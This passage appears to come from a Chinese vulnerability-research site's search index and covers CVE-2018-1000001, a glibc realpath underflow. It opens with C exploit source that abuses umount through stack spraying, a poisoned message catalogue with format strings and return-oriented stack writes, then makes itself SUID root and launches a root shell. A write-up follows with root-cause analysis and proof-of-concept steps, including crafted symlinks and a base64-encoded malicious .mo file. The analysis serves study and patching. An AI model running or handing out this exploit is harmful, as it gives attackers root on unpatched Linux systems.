write pointer to an 8-byte aligned argv-list pointer and\n// update argv[0] to point to argv[1..n].\n  writeCount=(((long long)argvStackAddress)-(writeCount+56))&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn\",\n      writeCount, writeCount, printfArgvValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Append a debugging preamble.\n  result=snprintf(formatBuffer, bufferSize, \"-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\\n\",\n      printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,\n      printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,\n      printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);\n  formatBuffer+=result;\n  bufferSize-=result;\n}\n\n\n\n\n/** Wait for the trigger pipe to open. The pipe will be closed\n *  immediately after opening it.\n *  @return 0 when the pipe was opened before hitting a timeout.\n */\nint waitForTriggerPipeOpen(char *pipeName) {\n  struct timespec startTime, currentTime;\n  int result=clock_gettime(CLOCK_MONOTONIC, &startTime);\n  startTime.tv_sec+=10;\n  assert(!result);\n  while(1) {\n    int pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);\n    if(pipeFd>=0) {\n      close(pipeFd);\n      break;\n    }\n    result=clock_gettime(CLOCK_MONOTONIC, &currentTime);\n    if(currentTime.tv_sec>startTime.tv_sec) {\n      return(-1);\n    }\n    currentTime.tv_sec=0;\n    currentTime.tv_nsec=100000000;\n    nanosleep(&currentTime, NULL);\n  }\n  return(0);\n}\n\n\n\n\n/** Invoke umount to gain root privileges.\n *  @return 0 if the umount process terminated with expected exit\n *  status.\n */\nint attemptEscalation() {\n  int escalationSuccess=-1;\n\n\n  char targetCwd[64];\n  snprintf(\n      targetCwd, sizeof(targetCwd)-1, \"/proc/%d/cwd\", namespacedProcessPid);\n\n\n  int pipeFds[2];\n  int result=pipe(pipeFds);\n  assert(!result);\n\n\n  pid_t childPid=fork();\n  assert(childPid>=0);\n  if(!childPid) {\n// This is the child process.\n    close(pipeFds[0]);\n    fprintf(stderr, \"Starting subprocess\\n\");\n    dup2(pipeFds[1], 1);\n    dup2(pipeFds[1], 2);\n    close(pipeFds[1]);\n    result=chdir(targetCwd);\n    assert(!result);\n\n\n// Create so many environment variables for a kind of \"stack spraying\".\n    int envCount=UMOUNT_ENV_VAR_COUNT;\n    char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));\n    assert(umountEnv);\n    umountEnv[envCount--]=NULL;\n    umountEnv[envCount--]=\"LC_ALL=C.UTF-8\";\n    while(envCount>=0) {\n      umountEnv[envCount--]=\"AANGUAGE=X.X\";\n    }\n// Use the built-in C locale.\n// Invoke umount first by overwriting heap downwards using links\n// for \"down\", then retriggering another error message (\"busy\")\n// with hopefully similar same stack layout for other path \"/run\".\n// The path \"/\" cannot be used as it is registered in \"/run/mount/utab\"\n// on standard desktop Xenial installs, thus triggering different\n// code path.\n    char* umountArgs[]={umountPathname, \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"down\", \"LABEL=78\", \"LABEL=789\", \"LABEL=789a\", \"LABEL=789ab\", \"LABEL=789abc\", \"LABEL=789abcd\", \"LABEL=789abcde\", \"LABEL=789abcdef\", \"LABEL=789abcdef0\", \"LABEL=789abcdef0\", NULL};\n    result=execve(umountArgs[0], umountArgs, umountEnv);\n    assert(!result);\n  }\n  close(pipeFds[1]);\n  int childStdout=pipeFds[0];\n\n\n  int escalationPhase=0;\n  char readBuffer[1024];\n  int readDataLength=0;\n  char stackData[STACK_LONG_DUMP_BYTES];\n  int stackDataBytes=0;\n\n\n  struct pollfd pollFdList[1];\n  pollFdList[0].fd=childStdout;\n  pollFdList[0].events=POLLIN;\n\n\n// Now learn about the binary, prepare data for second exploitation\n// phase. The phases should be:\n// * 0: umount executes, glibc underflows and causes an util-linux.mo\n//   file to be read, that contains a poisonous format string.\n//   Successful poisoning results in writing of 8*'A' preamble,\n//   we are looking for to indicate end of this phase.\n// * 1: The poisoned process writes out stack content to defeat\n//   ASLR. Reading all relevant stack end this phase.\n// * 2: The poisoned process changes the \"LANGUAGE\" parameter,\n//   thus triggering re-read of util-linux.mo. To avoid races,\n//   we let umount open a named pipe, thus blocking execution.\n//   As soon as the pipe is ready for writing, we write a modified\n//   version of util-linux.mo to another file because the pipe\n//   cannot be used for sending the content.\n// * 3: We read umount output to avoid blocking the process and\n//   wait for it to ROP execute fchown/fchmod and exit.\n  while(1) {\n    if(escalationPhase==2) {\n// We cannot use the standard poll from below to monitor the pipe,\n// but also we do not want to block forever. Wait for the pipe\n// in nonblocking mode and then continue with next phase.\n      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);\n      if(result) {\n        goto attemptEscalationCleanup;\n      }\n      escalationPhase++;\n    }\n\n\n// Wait at most 10 seconds for IO.\n    result=poll(pollFdList, 1, 10000);\n    if(!result) {\n// We ran into a timeout. This might be the result of a deadlocked\n// child, so kill the child and retry.\n      fprintf(stderr, \"Poll timed out\\n\");\n      goto attemptEscalationCleanup;\n    }\n// Perform the IO operations without blocking.\n    if(pollFdList[0].revents&(POLLIN|POLLHUP)) {\n      result=read(\n          pollFdList[0].fd, readBuffer+readDataLength,\n          sizeof(readBuffer)-readDataLength);\n      if(!result) {\n        if(escalationPhase<3) {\n// Child has closed the socket unexpectedly.\n          goto attemptEscalationCleanup;\n        }\n        break;\n      }\n      if(result<0) {\n        fprintf(stderr, \"IO error talking to child\\n\");\n        goto attemptEscalationCleanup;\n      }\n      readDataLength+=result;\n\n\n// Handle the data depending on escalation phase.\n      int moveLength=0;\n      switch(escalationPhase) {\n        case 0: // Initial sync: read A*8 preamble.\n          if(readDataLength<8)\n            continue;\n          char *preambleStart=memmem(readBuffer, readDataLength,\n              \"AAAAAAAA\", 8);\n          if(!preambleStart) {\n// No preamble, move content only if buffer is full.\n            if(readDataLength==sizeof(readBuffer))\n              moveLength=readDataLength-7;\n            break;\n          }\n// We found, what we are looking for. Start reading the stack.\n          escalationPhase++;\n          moveLength=preambleStart-readBuffer+8;\n        case 1: // Read the stack.\n// Consume stack data until or local array is full.\n          while(moveLength+16<=readDataLength) {\n            result=sscanf(readBuffer+moveLength, \"%016lx\",\n                (long*)(stackData+stackDataBytes));\n            if(result!=1) {\n// Scanning failed, the data injection procedure apparently did\n// not work, so this escalation failed.\n              goto attemptEscalationCleanup;\n            }\n            moveLength+=sizeof(long)*2;\n            stackDataBytes+=sizeof(long);\n// See if we reached end of stack dump already.\n            if(stackDataBytes==sizeof(stackData))\n              break;\n          }\n          if(stackDataBytes!=sizeof(stackData))\n            break;\n\n\n// All data read, use it to prepare the content for the next phase.\n          fprintf(stderr, \"Stack content received, calculating next phase\\n\");\n\n\n          int *exploitOffsets=(int*)osReleaseExploitData[3];\n\n\n// This is the address, where source Pointer is pointing to.\n          void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];\n// This is the stack address source for the target pointer.\n          void *sourcePointerLocation=sourcePointerTarget-0xd0;\n\n\n          void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];\n// This is the stack address of the libc start function return\n// pointer.\n          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;\n          fprintf(stderr, \"Found source address location %p pointing to target address %p with value %p, libc offset is %p\\n\",\n              sourcePointerLocation, sourcePointerTarget,\n              targetPointerTarget, libcStartFunctionReturnAddressSource);\n// So the libcStartFunctionReturnAddressSource is the lowest address\n// to manipulate, targetPointerTarget+...\n\n\n          void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];\n          void *stackWriteData[]={\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]\n          };\n          fprintf(stderr, \"Changing return address from %p to %p, %p\\n\",\n              libcStartFunctionAddress, stackWriteData[0],\n              stackWriteData[1]);\n          escalationPhase++;\n\n\n          char *escalationString=(char*)malloc(1024);\n          createStackWriteFormatString(\n              escalationString, 1024,\n              exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf\n              sourcePointerTarget, // Base value to write\n              exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...\n              libcStartFunctionReturnAddressSource,\n              (unsigned short*)stackWriteData,\n              sizeof(stackWriteData)/sizeof(unsigned short)\n          );\n          fprintf(stderr, \"Using escalation string %s\", escalationString);\n\n\n          result=writeMessageCatalogue(\n              secondPhaseCataloguePathname,\n              (char*[]){\n                  \"%s: mountpoint not found\",\n                  \"%s: not mounted\",\n                  \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n              },\n              (char*[]){\n                  escalationString,\n                  \"BBBB5678%3$s\\n\",\n                  \"BBBBABCD%s\\n\"},\n              3);\n          assert(!result);\n          break;\n        case 2:\n        case 3:\n// Wait for pipe connection and output any result from mount.\n          readDataLength=0;\n          break;\n        default:\n          fprintf(stderr, \"Logic error, state %d\\n\", escalationPhase);\n          goto attemptEscalationCleanup;\n      }\n      if(moveLength) {\n        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);\n        readDataLength-=moveLength;\n      }\n    }\n  }\n\n\nattemptEscalationCleanup:\n// Wait some time to avoid killing umount even when exploit was\n// successful.\n  sleep(1);\n  close(childStdout);\n// It is safe to kill the child as we did not wait for it to finish\n// yet, so at least the zombie process is still here.\n  kill(childPid, SIGKILL);\n  pid_t waitedPid=waitpid(childPid, NULL, 0);\n  assert(waitedPid==childPid);\n\n\n  return(escalationSuccess);\n}\n\n\n\n\n/** This function invokes the shell specified via environment\n *  or the default shell \"/bin/sh\" when undefined. The function\n *  does not return on success.\n *  @return -1 on error\n */\nint invokeShell(char *shellName) {\n  if(!shellName)\n    shellName=getenv(\"SHELL\");\n  if(!shellName)\n    shellName=\"/bin/sh\";\n  char* shellArgs[]={shellName, NULL};\n  execve(shellName, shellArgs, environ);\n  fprintf(stderr, \"Failed to launch shell %s\\n\", shellName);\n  return(-1);\n}\n\n\nint main(int argc, char **argv) {\n  char *programmName=argv[0];\n  int exitStatus=1;\n\n\n  if(getuid()==0) {\n    fprintf(stderr, \"%s: you are already root, invoking shell ...\\n\",\n        programmName);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  if(geteuid()==0) {\n    struct stat statBuf;\n    int result=stat(\"/proc/self/exe\", &statBuf);\n    assert(!result);\n    if(statBuf.st_uid||statBuf.st_gid) {\n      fprintf(stderr, \"%s: internal invocation, setting SUID mode\\n\",\n          programmName);\n      int handle=open(\"/proc/self/exe\", O_RDONLY);\n      fchown(handle, 0, 0);\n      fchmod(handle, 04755);\n      exit(0);\n    }\n\n\n    fprintf(stderr, \"%s: invoked as SUID, invoking shell ...\\n\",\n        programmName);\n    setresgid(0, 0, 0);\n    setresuid(0, 0, 0);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  for(int argPos=1; argPos<argc;) {\n    char *argName=argv[argPos++];\n    if(argPos==argc) {\n      fprintf(stderr, \"%s requires parameter\\n\", argName);\n      return(1);\n    }\n    if(!strcmp(\"--Pid\", argName)) {\n      char *endPtr;\n      namespacedProcessPid=strtoll(argv[argPos++], &endPtr, 10);\n      if((errno)||(*endPtr)) {\n        fprintf(stderr, \"Invalid pid value\\n\");\n        return(1);\n      }\n      killNamespacedProcessFlag=0;\n    } else {\n      fprintf(stderr, \"Unknown argument %s\\n\", argName);\n      return(1);\n    }\n  }\n\n\n  fprintf(stderr, \"%s: setting up environment ...\\n\", programmName);\n\n\n  if(!osRelease) {\n    if(detectOsRelease()) {\n      fprintf(stderr, \"Failed to detect OS version, continuing anyway\\n\");\n    }\n  }\n\n\n  umountPathname=findUmountBinaryPathname(\"/bin\");\n  if((!umountPathname)&&(getenv(\"PATH\")))\n    umountPathname=findUmountBinaryPathname(getenv(\"PATH\"));\n  if(!umountPathname) {\n    fprintf(stderr, \"Failed to locate \\\"umount\\\" binary, is PATH correct?\\n\");\n    goto preReturnCleanup;\n  }\n  fprintf(stderr, \"%s: using umount at \\\"%s\\\".\\n\", programmName,\n      umountPathname);\n\n\n  pid_t nsPid=prepareNamespacedProcess();\n  if(nsPid<0) {\n    goto preReturnCleanup;\n  }\n\n\n// Gaining root can still fail due to ASLR creating additional\n// path separators in memory addresses residing in area to be\n// overwritten by buffer underflow. Retry regaining until this\n// executable changes uid/gid.\n  int escalateMaxAttempts=10;\n  int excalateCurrentAttempt=0;\n  while(excalateCurrentAttempt<escalateMaxAttempts) {\n    excalateCurrentAttempt++;\n    fprintf(stderr, \"Attempting to gain root, try %d of %d ...\\n\",\n        excalateCurrentAttempt, escalateMaxAttempts);\n\n\n    attemptEscalation();\n\n\n    struct stat statBuf;\n    int statResult=stat(\"/proc/self/exe\", &statBuf);\n       int stat(const char *pathname, struct stat *buf);\n    if(statResult) {\n      fprintf(stderr, \"Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\\n\");\n      break;\n    }\n    if(statBuf.st_uid==0) {\n      fprintf(stderr, \"Executable now root-owned\\n\");\n      goto escalateOk;\n    }\n  }\n\n\n  fprintf(stderr, \"Escalation FAILED, maybe target system not (yet) supported by exploit!\\n\");\n\n\npreReturnCleanup:\n  if(namespacedProcessPid>0) {\n    if(killNamespacedProcessFlag) {\n      kill(namespacedProcessPid, SIGKILL);\n    } else {\n// We used an existing namespace or chroot to escalate. Remove\n// the files created there.\n      fprintf(stderr, \"No namespace cleanup for preexisting namespaces yet, do it manually.\\n\");\n    }\n  }\n\n\n  if(!exitStatus) {\n    fprintf(stderr, \"Cleanup completed, re-invoking binary\\n\");\n    invokeShell(\"/proc/self/exe\");\n    exitStatus=1;\n  }\n  return(exitStatus);\n\n\nescalateOk:\n  exitStatus=0;\n  goto preReturnCleanup;\n}",
            "title": "exp\u6e90\u7801"
        },
        {
            "location": "/cve-2018-1000001/",
            "text": "cve-2018-1000001\n\n\n0.\u4f5c\u8005\n\n\ninvincible1944@gmail.com\n\n\n1.\u80cc\u666f\u4ecb\u7ecd\n\n\n\n\n\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6\n\n\n\n\nglibc <= 2.26\n\n\n\n\n\n\nGLibc\u7b80\u4ecb\n\n\n\n\n\n\nGNU/Linux systems\u7b49\u4f7f\u7528Linux\u5185\u6838\u7cfb\u7edf\u7684\u6838\u5fc3C\u4ee3\u7801\u5e93\n\n\n\n\n\n\n\u8fd9\u4e9b\u4ee3\u7801\u5e93\u63d0\u4f9b\u4e25\u683c\u9075\u5faaISO C11, POSIX.1-2008, BSD\u7b49\u6807\u51c6\u7684API\n\n\n\n\n\n\n\u8fd9\u4e9bAPI\u5305\u542b open, read, write, malloc, printf\u7b49\u57fa\u672c\u51fd\u6570\n\n\n\n\n\n\n\u53c2\u8003\u4e00(GLIBC \u5b98\u7f51)\n, \n\u53c2\u8003\u4e8c(Linux manual)\n\n\n\n\n\n\n\u6f0f\u6d1e\u5371\u5bb3\n\n\n\n\n\n\n\u5bf9\u672a\u5b89\u88c5\u8865\u4e01\u7684Linux\u7cfb\u7edf\u8fdb\u884c\u672c\u5730\u63d0\u6743\u3002\n\n\nKnown Affected Software Configurations\n\n\n\n\n\u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6\n\n\n\n\nnamespaces\n  \n\n\nuser_namespaces\n \n\n\nmount_namespaces\n\n\nsetlocale - set the current locale\n\n\nGettext\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n2.\u6f0f\u6d1e\u5206\u6790\n\n\n\n\n\u6f0f\u6d1e\u539f\u7406\n\n\n\n\n\u7f13\u51b2\u533a\u8fb9\u754c\u5224\u65ad\u4e0d\u4e25\u683c\u9020\u6210\u8d8a\u754c\u5199\u3002\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c\n\n\n\n\n\u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1aglibc <= 2.26\n\n\n\u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a\nglibc-2.26/stdlib/canonicalize.c -> __realpath( line 122, 199 )\n\n\nGLibc \u5b98\u7f51\nGLibc \u6e90\u7801\u5e93\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\n\n\n\n\nCWE-787: Out-of-bounds Write\n\n\n\n\n\u6f0f\u6d1e\u8865\u4e01\n\n\n\n\nglibc upstream\n\n\n\n\n\u6f0f\u6d1eCVE\u53f7\n\n\n\n\nCVE-2018-1000001 \n\n\n3.POC\n\n\na.POC\u539f\u7406\n\n\n\n\n\n\n\u6784\u9020\u7279\u6b8a\u7684namespace\u8fdb\u7a0b(\u4e0b\u6587\u79f0ns_proc)\uff0c\u5e76\u5728\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u6784\u5efa\u7279\u6b8a\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u5305\u542b\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u548c\u7279\u5236\u7684NLS\u6587\u4ef6\n\n\n\n\n\n\n\u4f7fumount\u5728ns_proc\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u8fd0\u884c\uff0c\u5378\u8f7d\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u8986\u76d6setloacle\u9700\u8981\u52a0\u8f7d\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\uff0c\u8feb\u4f7f\u5176\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u52a0\u8f7d\u7279\u5236\u7684 NLS\u6587\u4ef6\n\n\n\n\n\n\n\u7279\u5236NLS\u6587\u4ef6\u80fd\u591f\u63a7\u5236umount\u7684error\u4fe1\u606f\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u5229\u7528%n\u83b7\u53d6\u5199\u5165\u6808\u5185\u5b58\u7684\u80fd\u529b\uff0c\u800c\u521a\u597d\u80fd\u591f\u4fee\u6539umount libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u6807\u5fd7\u4f4d\uff0c\u4f7fumount\u8ba4\u4e3a\u8c03\u7528\u8005\u4e3aroot\u6743\u9650\uff0c\u8fdb\u800c\u5141\u8bb8\u540e\u7eed\u7684umout / \u64cd\u4f5c\uff0c\u4ece\u800c\u5b9e\u73b0DOS\n\n\n\n\n\n\nb.POC\u6e90\u7801\n\n\n\u89c1\u9644\u4ef6: cve-2018-1000001-01.md\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u590d\u73b0\u73af\u5883\n\n\n\n\n\n\n\u73af\u5883\u4fe1\u606f\n\n\n\n\n\u7cfb\u7edf\u7248\u672c: Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux\n\n\n\u53d1\u884c\u7248\u540d\u79f0: Debian GNU/Linux 9 (stretch)\n\n\nglibc\u7248\u672c:  Debian GLIBC 2.24-11+deb9u4\n\n\ngcc\u7248\u672c:  gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\n\n\numount\u7248\u672c: umount from util-linux 2.29.2 \n\n\n\u955c\u50cf\u4e0b\u8f7d\u5730\u5740\uff1a\ndebian-9.12.0-amd64-DVD-1.iso\n\n\n\u865a\u62df\u673a\u8f6f\u4ef6\uff1aVMwareFusion \u4e13\u4e1a\u7248 11.5.1 (15018442)\n\n\n\u865a\u62df\u673a\u8f6f\u4ef6\uff1aQEMU emulator version 4.2.0\n\n\n\n\n\n\n\n\nQEMU\u865a\u62df\u673a\u642d\u5efa\u6b65\u9aa4\n\n\n```shell\n\n\n1. \u53bb\u4e0a\u9762\ud83d\udc46\u7ed9\u51fa\u7684\u5730\u5740\u5904\u4e0b\u8f7d\u955c\u50cf\n\n\n2. \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n\n\n$ qemu-img create -f qcow2 debian9.img 10G\n\n\n3. \u5b89\u88c5\u865a\u62df\u673a(\u6709\u6761\u4ef6\u53ef\u4ee5\u589e\u52a0-enable-kvm\u9009\u9879)\n\n\n\u5224\u65ad\u65b9\u6cd5\uff1a\n\n\ngrep -E 'vmx|svm' /proc/cpuinfo\n\n\nlsmod | grep kvm\n\n\n$ qemu-system-x86_64  -m 2048 -hda debian9.img  -cdrom ./debian-9.12.0-amd64-DVD-1.iso\n\n\n4. \u542f\u52a8\u865a\u62df\u673a\n\n\n$ qemu-system-x86_64 -m 2048  debian9.img\n\n\n5. \u542f\u52a8\u540e\u5b89\u88c5GCC\n\n\n$ su\n$ apt install gcc\n\n\n```\n\n\n\n\n\u6b65\u9aa4\u4e00 \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650\n\n\n\n\nshell\n # \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\n root$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n\n\n\n\n\n\n\u6b65\u9aa4\u4e8c \u521b\u5efa\u5177\u6709\u72ec\u7acb user/mount namespace\u7684\u8fdb\u7a0b(\u4e0b\u6587\u79f0us_proc)\n\n\n\n\n\n\n\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u5165us_proc\u8fdb\u7a0b\u7684\"/proc/[us_proc pid]/cwd\"\u76ee\u5f55\u540e\uff0c\u7528realpath(getcwd)\u83b7\u53d6\u7684\u76f8\u5bf9\u76ee\u5f55\u5747\u5305\u542b\"(unreachable)/tmp/\"\u524d\u7f00\n\n\n\n\n\n\n```shell\n  /usr/bin/unshare -m -U --map-root-user /bin/bash\n  mount -t tmpfs tmpfs /tmp\n  cd /tmp\n  chmod 00755 .\n\n\n# Terminal 1\n  debian@debian:~/Desktop/work$ /usr/bin/unshare -m -U --map-root-user /bin/bash\n  root@debian:~/Desktop/work# mount -t tmpfs tmpfs /tmp\n  root@debian:~/Desktop/work# cd /tmp\n  root@debian:/tmp# chmod 00755 .\n  root@debian:/tmp# echo $$\n  52426\n  root@debian:/tmp# \n\n\n# \u6548\u679c\u5982\u4e0b\n  # Terminal 2\n  $ cd /proc/52426/cwd\n  debian@debian:/proc/52426/cwd$ \n  debian@debian:/proc/52426/cwd$ realpath .\n  (unreachable)/tmp\n  debian@debian:/proc/52426/cwd$ realpath ../x\n  (unreachable)/x\n  debian@debian:/proc/52426/cwd\n\n\n```\n\n\n\n\n\n\n\u6b65\u9aa4\u4e09 \u521b\u5efa\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u7684\u76ee\u5f55\u548c\u6587\u4ef6\n\n\n\n\n\n\n__gconv_find_shlib/C/LC_MESSAGES\n\u76ee\u5f55\u662fsetloacale\u5bfb\u627emo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\n    \u7279\u522b\u6ce8\u610f\u7684\u4e00\u70b9\uff1a\n__gconv_find_shlib\n \u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u4e0d\u4e00\u6837\uff0c\u5728\u6f0f\u6d1e\u4f5c\u8005\u7684exp\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u4e24\u4e2a\u76ee\u5f55(\nfrom_archive, _nl_load_locale_from_archive\n) \n\n\n\n\n\"(unreachable)/x\" \u662frealpath\u89e3\u6790\u7b26\u53f7\u94fe\u63a5\u7684\u8fd4\u56de\u503c\u5bf9\u5e94\u7684\u76ee\u5f55\n\n\nutil-linux.mo\u6587\u4ef6\u7528\u4e8e\u4fdd\u5b58\u7279\u5236\u7684libc\u4f9d\u8d56\u7684.mo\u7ffb\u8bd1\u6587\u4ef6\n\n\n\u7b26\u53f7\u94fe\u63a5\u7528\u4e8e\u89e6\u53d1\u8d8a\u754c\u5199\u6f0f\u6d1e\n\n\nutil-linux.mo\u4fdd\u5b58\u4e86\u89e6\u53d1DOS\u7684\u7279\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\"AA%6$lnlnAAAAAAAAAA\"\n\n\n\n\n```shell\n  mkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/\ngconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\n  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\n  base64 -d <\n \"(unreachable)/tmp/\ngconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\n  QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\n  mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\n  iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n  5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\n  B64-EOF\n\n\nroot@debian:/tmp# tree\n  .\n  \u2514\u2500\u2500 (unreachable)\n      \u251c\u2500\u2500 tmp\n      \u2502   \u251c\u2500\u2500 down -> ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\n      \u2502   \u2514\u2500\u2500 __gconv_find_shlib\n      \u2502       \u2514\u2500\u2500 C\n      \u2502           \u2514\u2500\u2500 LC_MESSAGES\n      \u2502               \u2514\u2500\u2500 util-linux.mo\n      \u2514\u2500\u2500 x\n\n\nroot@debian:/tmp# strings \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\n  %s: not mounted\n  Language: en\n  MIME-Version: 1.0\n  Content-Type: text/plain; charset=UTF-8\n  Content-Transfer-Encoding: 8bit\n  AA%6$lnlnAAAAAAAAAA\n\n\n```\n\n\n\n\n\n\n\u6b65\u9aa4\u56db \u901a\u8fc7umount\u89e6\u53d1DOS\n\n\n\n\n\n\nLC_ALL\u73af\u5883\u53d8\u91cf\u4f1a\u4f7fsetlocale\u51fd\u6570\u53bb\u52a0\u8f7d\u7ffb\u8bd1\u6587\u4ef6\n\n\n\n\n\n\numount\u4f1a\u5148\u5c1d\u8bd5\u5378\u8f7ddown\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u4f1a\u89e6\u53d1realpath\u6f0f\u6d1e\u9020\u6210\u8d8a\u754c\u5199\uff0c\u5c06\u5806\u5185\u5b58\u4e2d\u7684\n\"/usr/lib/locale/C.utf8/LC_CTYPE\"\n\u8def\u5f84\u5b57\u7b26\u4e32\u4e2dLC_CTYPE\u8986\u76d6\u4e3aAAAAAA(\u7565...)/A\n\n\n\n\n\n\n\u5f53realpath\u5c06down\u89e3\u6790\u4e3a(unreachable)/x\u540e\uff0cumount\u4f1a\u8c03\u7528warnx\u51fd\u6570\u6253\u5370\u8b66\u544a\u4fe1\u606f\uff0c\u6b64\u65f6\u4f1a\u52a0\u8f7d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c\n\"AA%6$lnlnAAAAAAAAAA\"\n\u66ff\u6362\u6389warnx\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\n\"%s: not mounted\"\n\n\n\n\n\n\n\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0cumount\u6808\u4e2dRSP\u5b58\u653e\u7684\u5730\u5740\u5904\u7684\u6307\u9488\u6307\u5411\u7684\nlong int\u503c(*(long *)$RSP)\n\u4f1a\u88ab\u4fee\u6539\u4e3a2\u3002\u8fd9\u4f1a\u5c06\u8be5\u5904\u5b58\u653e\u7684libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u5b57\u6bb5\u4fee\u6539\u4e3a0, \u4ece\u800c\u8ba9umount\u8ba4\u4e3a\u8c03\u7528\u8005\u662froot\u7528\u6237\uff0c\u5e76\u6210\u529f\u8fdb\u884c\u540e\u9762\u7684umount / \u64cd\u4f5c\u3002\n\n\n\u8fd9\u4e2a\u6b65\u9aa4\u76f8\u5173\u7684umount\u8c03\u7528\u6808:\n\n\nmain->umount_one->make_exit_code->warnx(_(\"%s: not mounted\"), tgt);\n\n\n( \n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n , \nx64\u4f20\u53c2\u987a\u5e8f\n )\n\n\n\n\n\n\nshell\n  test$ cd /proc/2299/cwd\n  test$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\n  AAlnAAAAAAAAAA\n\n\n\n\n\n\n4.EXP\n\n\na.EXP\u539f\u7406\n\n\n\u51c6\u5907\u9636\u6bb5(prepareNamespacedProcess)\n\n\n\n\n\u5148\u901a\u8fc7clone\u542f\u52a8\u4e00\u4e2a\u62e5\u6709\u72ec\u7acbuser/mount 